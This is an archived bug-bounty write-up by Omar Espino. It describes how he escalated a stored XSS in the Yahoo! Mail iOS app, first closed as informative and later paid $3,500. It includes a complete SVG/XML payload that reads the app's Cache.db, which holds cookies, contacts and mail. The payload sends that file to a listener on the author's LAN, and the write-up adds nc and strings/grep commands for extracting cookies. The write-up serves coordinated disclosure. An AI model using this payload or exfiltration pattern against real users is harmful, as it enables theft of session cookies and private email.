---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-07_write-up-love-story-from-closed-as-informative-to-3500-usd-xss-stored-in-yahoo-i.md
original_filename: 2018-09-07_write-up-love-story-from-closed-as-informative-to-3500-usd-xss-stored-in-yahoo-i.md
title: Write-up - Love story, from closed as informative to $3,500 USD, XSS stored
  in Yahoo! iOS MaiL app
category: documents
detected_topics:
- xss
- mobile-security
- sso
- command-injection
- supply-chain
tags:
- imported
- documents
- xss
- mobile-security
- sso
- command-injection
- supply-chain
language: en
raw_sha256: 093f5dff6bb5c55eee72112b3d239c820c2935db716d6baf420ec67b65002561
text_sha256: 4f50659509c01eb7256cf99e671b62a9e0b51979fc25990cc6c2fd786c7ea721
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Write-up - Love story, from closed as informative to $3,500 USD, XSS stored in Yahoo! iOS MaiL app

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-07_write-up-love-story-from-closed-as-informative-to-3500-usd-xss-stored-in-yahoo-i.md
- Source Type: markdown
- Detected Topics: xss, mobile-security, sso, command-injection, supply-chain
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `093f5dff6bb5c55eee72112b3d239c820c2935db716d6baf420ec67b65002561`
- Text SHA256: `4f50659509c01eb7256cf99e671b62a9e0b51979fc25990cc6c2fd786c7ea721`


## Content

---
title: "Write-up - Love story, from closed as informative to $3,500 USD, XSS stored in Yahoo! iOS MaiL app"
page_title: "LOVE STORY, FROM CLOSED AS INFORMATIVE TO $3,500 USD, XSS STORED IN YAHOO! IOS MAIL APP – @omespino"
url: "http://omespino.com/write-up-lovestory-from-closed-as-informative-to-xx00-usd-in-yahoo-ios-mail-app/"
final_url: "https://omespino.com/write-up-lovestory-from-closed-as-informative-to-xx00-usd-in-yahoo-ios-mail-app/"
authors: ["Omar Espino (@omespino)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["Stored XSS"]
bounty: "3,500"
publication_date: "2018-09-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5719
---

MOBILE$3,500 USD[September 2018](/write-up-lovestory-from-closed-as-informative-to-xx00-usd-in-yahoo-ios-mail-app/)

# LOVE STORY, FROM CLOSED AS INFORMATIVE TO $3,500 USD, XSS STORED IN YAHOO! IOS MAIL APP

**Introduction**  
Hi everyone It’s been a while since my last post but I’m back, I want to tell you a love story about Yahoo! bug bounty program that is very great because I learned a lot of lessons, so I got into [Yahoo! Security Hall of Fame (2018)](https://hackerone.com/yahoo/thanks/2018) via [Hackerone](https://www.hackerone.com/), so here we go:  

**Report Summary (first try):**

Hi Yahoo! team. I’ve found an XSS stored in Yahoo! Mail iOS app via an XML file.

**Description and impact:**

The attackers can render arbitrary HTML/Javascript code via XML specially crafted in the background since the code runs every time that you open any attachment in the same email in Yahoo! Mail iOS application in the production environment. (and make exponential entity expansion DOS attack and crash the app)

**Steps To Reproduce (Extracted from the h1 report):**

1.- Login to your yahoo email account in any client and upload a xml file with the following content and send it via email (yahoo-xss.xml file attached):  
``
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
  <script>prompt(document.location)</script>
  </svg>
  

2.- Lookup for the XML file in the iOS app, click to open it and see the XSS.

Note: I don’t why, but the XML rendering behavior in the Yahoo! Mail iOS app is very weird and dangerous, the XSS stored shows up when you click any email attachment, for example, if you have 5 attachments, if you click any of them, the XSS shows up every single time no matters what attachment you opened

[![](/assets/images/2018/09/Screen_Shot_2018-09-06_at_10_52_43_PM-581x1024.webp)](/assets/images/2018/09/Screen_Shot_2018-09-06_at_10_52_43_PM.webp)

**Hackerone staff response ( Closed as informative )**

[![](/assets/images/2018/09/Screen-Shot-2018-09-06-at-10.54.15-PM-1024x392.webp)](/assets/images/2018/09/Screen-Shot-2018-09-06-at-10.54.15-PM.webp)

well, then at this moment I need to find a way to prove to myself that this can be exploitable in a pretty bad way, but nothing came to my mind so I just keep going with my life.

**Resend the report (second try):**

One day I thought about that closed as an informative report on h1 about yahoo XSS and I got an idea that helps me to escalate that inoffensive XSS to something bigger, What if I could make an HTTP request like “GET” to local app resources? BINGO That’s how I was able to get a full cache database of yahoo! iOS app included user cookies, contact list, email content, etc.

**Steps To Reproduce (Extracted from the h1 report):**

1.- Log in to your yahoo email account in any client and upload an XML file with the following content and send it via email (dump_mails.xml and cachedb_post.xml file attached).

2.- Open the email attachment: Scenario the attacker send a PowerPoint presentation but there is the XML attached to, so when the victim opens the PowerPoint file I don’t why, but the XML the XSS stored works, per example, if you have 5 attachments, if you click any of them, the XSS shows up every single time no matters what attachment you opened (video attached).

Getting the mail contact list, including senders, receivers and contact list (dump_mails.xml) :  
3A.- See the XSS’s show up first the navigator.appVersion, then the file location, then the email list (take some time about 30s depending your internet connection) and when you click ok the email list is sent via GET to any sever (screenshot attached), in my case was my own computer in my LAN. with nc -lvvv 8090

Getting the Cookies (cache.db file via cachedb_post.xml) :  
3B.- See the XSS’s shows up first in the navigator.appVersion, then the file location, then see an “empty” alert (take some time about 30s depending your internet connection), but when you click ok the full Cache.db file is sent via POST to any sever (screenshot attached), in my case was my own computer in my LAN. with nc -lvvv 8090 > yahoo.db

then after dumping the cache.db file erase the headers and then make the query to get the cookies
  
  
  strings yahoo.db | grep -i Cookie -A 10 -B 5

bonus: also you can enumerate the app http endpoints to “use” the cookies.
  
  
  strings yahoo.db | grep -i https

Impact: Any attacker cand steal the Cookies and Yahoo! user emails (including senders,receivers and contact list even the email content) via cache.db in the background and send it to any server.  

**script transcript:**
  
  
  // cachedb_post.xml file
  <?xml version="1.0" encoding="utf-8"?>
  <svg onload="alert(document.location);" xmlns="http://www.w3.org/2000/svg">
  <script>
  alert(navigator.appVersion);
  <![CDATA[
  function GetMailAddress(mailcontent){
  var content_reg = new RegExp(".+",'g');
  var reg = mailcontent.replace('/\s/g','').replace('/\S/g','').replace(/\s\s+/g,' ').replace(/\n\s*\n/g,'\n').match(content_reg);
  alert(reg);
  send_response(reg)
  }
  function read_file(read_file_path,tag){
  var oReq = new XMLHttpRequest();
  oReq.addEventListener("load", function(){
  if (tag === true){
  GetMailAddress(this.responseText.toString());
  } else {
  alert(this.responseText);
  }
  }
  );
  oReq.open("GET", read_file_path);
  oReq.send();
  }
  function send_response(response){
  var oReqX = new XMLHttpRequest();
  oReqX.open("POST","http://192.168.1.109:8090/");
  oReqX.send(response);
  }
  var Lib_file_path = location.href.split('Library')[0] + 'Library';
  var cache_db = Lib_file_path + '/Caches/com.yahoo.Aerogram/Cache.db';
  read_file(cache_db,true);
  ]]>
  </script>
  </svg>

[![](/assets/images/2018/09/yahoo-mail-list-1024x630.webp)](/assets/images/2018/09/yahoo-mail-list.webp)

[![](/assets/images/2018/09/yahoo-cookies-1024x588.webp)](/assets/images/2018/09/yahoo-cookies.webp)

**Hackerone staff response (Reopened, Trigged, Fixed and good bounty paid by Yahoo team)**

[![](/assets/images/2018/09/yahoo-reopened-1024x456.webp)](/assets/images/2018/09/yahoo-reopened.webp)

[![](/assets/images/2018/09/Screen-Shot-2018-09-06-at-11.33.49-PM-1024x220.webp)](/assets/images/2018/09/Screen-Shot-2018-09-06-at-11.33.49-PM.webp)

Environment  
iPhone 6 – iOS v11.2.5.  
Yahoo! Mail app v4.XX.X (XXXXX)  
My personal email account and all testing were sending emails to myself.

**Yahoo! Hall of fame:**

<https://hackerone.com/yahoo/thanks/2018>

well that’s it that is how this love story ends, if you have any thoughts, doubts, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/tutorial-universal-android-ssl-pinning-in-10-minutes-with-frida/)

[](/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/)
